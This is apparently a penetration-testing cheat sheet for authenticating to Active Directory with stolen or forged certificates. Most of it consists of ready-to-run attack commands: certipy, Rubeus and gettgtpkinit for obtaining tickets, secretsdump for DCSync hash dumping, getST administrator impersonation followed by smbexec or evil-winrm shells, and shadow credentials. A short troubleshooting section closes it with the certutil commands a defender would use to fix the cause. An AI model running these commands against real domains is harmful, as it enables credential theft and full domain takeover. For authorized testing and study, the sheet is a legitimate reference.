![image](https://github.com/Prinegheuls/Pentest-shitsheets/assets/144021275/3035d4a3-f408-41b9-a001-e9043f3df05e)


# Auth with certificate

With certipy :
--------------

```text-plain
certipy auth -pfx [computer].pfx -dc-ip [DC]
```
Certipy uses "UnPAC the hash" technique in order to retrieve NT hashes from the impersonated users Service Ticket. 

Alamano
-------

**Ask a TGT with the certificate** 

```text-plain
gettgtpkinit.py -pfx-base64 $(cat cert.b64) [DOMAIN/COMPUTER$] DC.ccache'
```

```text-plain
Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
```

```text-plain
Certipy auth 
```


**Then (for example) DCSYYYYYNNC**

```text-plain
export KRB5CCNAME=/workspace/DC.ccache
```

```text-plain
secretsdump -k -no-pass 
[DOMAIN/COMPUTER@DC_FQDN]
```

**Or if you cannot, use alternative way**

```text-plain
$ export KRB5CCNAME=/workspace/DC.ccache
$ (for cifs) getST.py -self -impersonate 'administrator' -altservice 'CIFS/[DC.domain]' -k -no-pass -dc-ip [IP] [domain]/[user] 
$ (for winrm) getST.py -self -impersonate 'administrator' -altservice 'HTTP/[DC.domain]' -k -no-pass -dc-ip [IP] [domain]/[user] 
$ smbexec.py -k -no-pass administrator@[DC.domain]
$ evil-winrm -i meereen.essos.local -r ESSOS.LOCAL
```

**Or Shadow Credentials**

```text-plain
certipy shadow auto -u [user] -p [password] -account [targeted account]
```

Common Errors 
--------------

*   KDC\_ERR\_PADATA\_TYPE\_NOSUPP : It could be because domain controllers does not have a proper certificate   

It is possible to use ldap (authentication through TLS) :  [https://github.com/AlmondOffSec/PassTheCert](https://github.com/AlmondOffSec/PassTheCert) or `certipy auth -ldap-shell`, then configure and exploit RBCD.

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4771

It is possible to patch this "issue": 
On the dc:
```
certutil -addstore root \\[ADCS]\CertEnroll\[ADCS.domain.local]_[CA-name].crt
certutil -addstore CA \\[ADCS]\CertEnroll\[CA-name].crl
certutil -addstore CA \\[ADCS]\CertEnroll\[CA-name]+.crl
gpupdate /force
```
